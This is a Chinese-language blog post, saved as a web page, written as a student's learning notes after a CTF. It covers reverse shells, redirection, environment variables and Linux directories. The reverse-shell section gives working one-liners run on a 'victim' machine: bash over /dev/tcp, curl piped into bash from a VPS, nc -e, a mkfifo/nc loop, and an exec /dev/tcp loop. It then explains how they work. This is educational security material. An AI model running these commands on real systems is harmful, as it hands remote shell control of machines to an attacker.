@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux&amp;shell&amp;反弹shell&amp;环境变量">
+<meta property="og:url" content="https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://polosec.github.io/img/dev1.jpg">
+<meta property="og:image" content="https://polosec.github.io/img/env1.jpg">
+<meta property="og:image" content="https://polosec.github.io/img/dir1.jpg">
+<meta property="article:published_time" content="2020-03-30T02:25:51.000Z">
+<meta property="article:modified_time" content="2020-03-30T09:11:33.208Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://polosec.github.io/img/dev1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>linux&amp;shell&amp;反弹shell&amp;环境变量</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/03/27/RSA-AES-Encryption/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&text=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&is_video=false&description=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=linux&amp;shell&amp;反弹shell&amp;环境变量&body=Check out this article: https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&name=linux&amp;shell&amp;反弹shell&amp;环境变量&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&t=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E3%80%81%E8%87%B4%E6%95%AC%EF%BC%88%E5%BC%BA%E7%83%88%E5%BB%BA%E8%AE%AE%E5%85%88%E9%98%85%E8%AF%BB%E5%8F%82%E8%80%83%E3%80%81%E8%87%B4%E6%95%AC%E7%9A%84%E6%96%87%E7%AB%A0%E5%86%8D%E9%98%85%E8%AF%BB%E6%9C%AC%E6%96%87%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-number">2.1.</span> <span class="toc-text">shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.2.</span> <span class="toc-text">curl反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.3.</span> <span class="toc-text">nc反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">2.2.4.</span> <span class="toc-text">exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.3.</span> <span class="toc-text">理解反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.</span> <span class="toc-text">环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.1.</span> <span class="toc-text">环境变量解析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">系统环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">用户环境变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%88%87%E6%8D%A2%E4%B8%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.2.</span> <span class="toc-text">用户切换与环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">2.5.</span> <span class="toc-text">Linux文件目录</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        linux&amp;shell&amp;反弹shell&amp;环境变量
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-30T02:25:51.000Z" itemprop="datePublished">2020-03-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>近期学习了许多关于Linux的基础知识，也从侧面反映出了我上课所学的基础知识没有多加练习，忘了不少。<br>本文学习路线：首先是在CTF比赛中遇到了需要反弹shell的问题，采用常用反弹shell的方式无法反弹，于是学习了用curl反弹shell等多种反弹shell的方式；探究反弹shell的本质，学习到了&lt;与&gt;以及输入输出重定向；<br>跑脚本的时候太麻烦，需要切换到脚本目录，于是学习了如何添加环境变量以及如何用alias。</p>
+</blockquote>
+<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>linux shell、反弹shell、重定向、环境变量</p>
+<h1 id="参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）"><a href="#参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）" class="headerlink" title="参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）"></a>参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a><br><a target="_blank" rel="noopener" href="http://www.linuxso.com/command/alias.html">http://www.linuxso.com/command/alias.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/revilwang/article/details/8374362">https://blog.csdn.net/revilwang/article/details/8374362</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/flw8840488/article/details/90513873">https://blog.csdn.net/flw8840488/article/details/90513873</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/lw305080/article/details/52054188">https://blog.csdn.net/lw305080/article/details/52054188</a><br><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-system-contents.html">https://www.runoob.com/linux/linux-system-contents.html</a></p>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>如何理解shell？<br>shell是用户与Linux内核之间的一层“代理”，用户通过shell与Linux内核建立联系。shell是在内核基础上编写的应用程序。<br>当然，shell也支持编程，这里不展开讲解。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>先说怎么反弹shell，再说反弹shell的原理。<br>首先攻击机上执行 nc -lvp 8888</p>
+<h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</p>
+<h3 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h3><p>首先在公网vps 写好反弹shell的语句 保存到ip/bash<br>RCE: curl ip/bash |bash //   |是管道符，意思是将上一个的输出作为下一个的输入</p>
+<h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>受害机执行 nc -e /bin/sh ip port<br>如果nc版本不对的话可以这样：<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</p>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done</p>
+<h2 id="理解反弹shell"><a href="#理解反弹shell" class="headerlink" title="理解反弹shell"></a>理解反弹shell</h2><ul>
+<li>第一句：bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1<br>理解：将交互式bash的输出与错误输出重定向到/dev/tcp/ip/port 文件，并且将标准输入重定向到标准输出。<br>前面的&amp;&gt;代表将输出与错误输出都重定向到后面的文件，后面的0&amp;&gt;1代表将标准输入（文件操作符0）重定向到标准输出（文件操作符1）。注意，这里的&amp;代表了识别后面的1为文件操作符（代表标准输出），而不是“1”这个文件。<br>Linux操作系统把所有内容都抽象为文件，包括tcp连接。<br>示意图<img src="/img/dev1.jpg"><br>虚线表示了stdin 重定向到stdout，由于stdout已经重定向到了/dev/tcp/ip/port ，所以stdin也将重定向到/dev/tcp/ip/port。</li>
+<li>第二句 RCE: curl ip/bash |bash //   |是管道符，意思是将上一个的输出作为下一个的输入<br>首先在公网vps上写一个文件，内容为bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 重命名为bash<br>然后再受害机上执行curl ip/bash | bash 意思就是说通过curl获取bash的html内容，并且作为下一个的输入。bash是Linux中的shell，用于用户和内核交互。相当于用户输入了bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1</li>
+<li>第三句 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f<br>相当于创建了一个管道/tmp/f ，错误输出重定向到标准输出，标准输出重定向到/tmp/f ,把cat /tmp/f的结果传给交互式shell执行，传给nc ip port。形成环路。<br>大佬解读：mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路<br>我的解读：其实后半段的意思就是把传进来的命令用/bash/sh 执行，然后把结果传给ip port,然后 ip port 发送的结果传给/tmp/f,然后cat tmp /f,然后shell执行….就这么套娃，交互式shell就成了。<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2>环境变量文件：</li>
+<li>/etc/profile 全局用户，应用于所有的Shell。</li>
+<li>/$HOME/.profile 当前用户，应用于所有的Shell。</li>
+<li>/etc/bash_bashrc 全局用户，应用于Bash Shell。</li>
+<li>~/.bashrc 局部当前，应用于Bash Sell。<br>写入/etc/profile文件<br>export $PATH:/dir/subdir<br><img src="/img/env1.jpg"><h3 id="环境变量解析过程"><a href="#环境变量解析过程" class="headerlink" title="环境变量解析过程"></a>环境变量解析过程</h3><h4 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h4>/etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,并从/etc/profile.d目录的配置文件中搜集shell的设置.<br>/etc/bashrc: 为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取.<h4 id="用户环境变量"><a href="#用户环境变量" class="headerlink" title="用户环境变量"></a>用户环境变量</h4>.bash_profile ：定义了用户的个人化路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。（在这个文件中有执行.bashrc的脚本）<br>.bashrc ：该文件包含专用于你的shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。例如你可以将用户自定义的alias或者自定义变量写到这个文件中。<br>.bash_history ：记录命令历史用的。<br>.bash_logout ：当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。<h3 id="用户切换与环境变量"><a href="#用户切换与环境变量" class="headerlink" title="用户切换与环境变量"></a>用户切换与环境变量</h3>大部分Linux发行版的默认账户是普通账户，而更改系统文件或者执行某些命令，需要root身份才能进行，这就需要从当前用户切换到root用户，Linux中切换用户的命令是su或su -<br>前者只是切换root身份，但shell环境仍然是普通用户的shell；<br>而后者连用户和shell环境一起切换成root身份了。只有切换了shell环境才不会出现PATH环境变量错误。su切换成root用户以后，pwd一下，发现工作目录仍然是普通用户的工作目录；而用su - 命令切换以后，工作目录变成root工作目录了。<h2 id="Linux文件目录"><a href="#Linux文件目录" class="headerlink" title="Linux文件目录"></a>Linux文件目录</h2><img src="/img/dir1.jpg"></li>
+</ul>
+<p>/bin：<br>bin是Binary的缩写, 这个目录存放着最经常使用的命令。</p>
+<p>/boot：<br>这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
+<p>/dev ：<br>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</p>
+<p>/etc：<br>这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p>
+<p>/home：<br>用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</p>
+<p>/lib：<br>这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</p>
+<p>/lost+found：<br>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p>
+<p>/media：<br>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p>
+<p>/mnt：<br>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。</p>
+<p>/opt：<br> 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
+<p>/proc：<br>这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p>
+<p>/root：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</p>
+<p>/sbin：<br>s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</p>
+<p>/selinux：<br> 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p>
+<p>/srv：<br> 该目录存放一些服务启动之后需要提取的数据。</p>
+<p>/sys：</p>
+<p> 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。</p>
+<p>sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。<br>该文件系统是内核设备树的一个直观反映。</p>
+<p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p>
+<p>/tmp：<br>这个目录是用来存放一些临时文件的。</p>
+<p>/usr：<br> 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p>
+<p>/usr/bin：<br>系统用户使用的应用程序。</p>
+<p>/usr/sbin：<br>超级用户使用的比较高级的管理程序和系统守护程序。</p>
+<p>/usr/src：<br>内核源代码默认的放置目录。</p>
+<p>/var：<br>这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p>
+<p>/run：<br>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E3%80%81%E8%87%B4%E6%95%AC%EF%BC%88%E5%BC%BA%E7%83%88%E5%BB%BA%E8%AE%AE%E5%85%88%E9%98%85%E8%AF%BB%E5%8F%82%E8%80%83%E3%80%81%E8%87%B4%E6%95%AC%E7%9A%84%E6%96%87%E7%AB%A0%E5%86%8D%E9%98%85%E8%AF%BB%E6%9C%AC%E6%96%87%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">参考、致敬（强烈建议先阅读参考、致敬的文章再阅读本文）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-number">2.1.</span> <span class="toc-text">shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">bash反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.2.</span> <span class="toc-text">curl反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">2.2.3.</span> <span class="toc-text">nc反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">2.2.4.</span> <span class="toc-text">exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.3.</span> <span class="toc-text">理解反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.</span> <span class="toc-text">环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.1.</span> <span class="toc-text">环境变量解析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">系统环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">用户环境变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%88%87%E6%8D%A2%E4%B8%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.4.2.</span> <span class="toc-text">用户切换与环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">2.5.</span> <span class="toc-text">Linux文件目录</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&text=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&is_video=false&description=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=linux&amp;shell&amp;反弹shell&amp;环境变量&body=Check out this article: https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&title=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&name=linux&amp;shell&amp;反弹shell&amp;环境变量&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/&t=linux&amp;shell&amp;反弹shell&amp;环境变量"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
